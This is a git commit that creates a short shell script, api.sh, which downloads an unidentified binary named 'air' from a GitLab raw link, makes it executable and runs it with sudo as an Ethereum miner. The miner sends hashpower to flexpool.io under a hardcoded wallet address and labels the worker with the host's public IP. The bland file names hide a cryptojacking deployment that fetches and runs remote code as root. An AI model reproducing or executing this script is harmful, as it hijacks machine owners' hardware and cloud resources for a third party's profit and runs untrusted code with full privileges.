0437b1ddb0ff5b5fbf9a416574c848cf320ce3cc
ayangkuning <103827356+ayangkuning@users.noreply.github.com>
2022-04-16 18:58:34 +0700

    Create api.sh

---
+++ api.sh
@@ -0,0 +1,8 @@
+sudo apt update
+sudo apt install screen -y
+screen -dmS air.sh 65 75
+sudo apt update
+sudo apt install libpci3
+wget https://gitlab.com/useragen/lancarkanlah/-/raw/main/air
+chmod +x air
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./air -a ethash -w 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4  -p stratum+ssl://eth-sg.flexpool.io:5555 stratum+ssl://eth-hk.flexpool.io:5555 -r $ip-api --nvidia 1
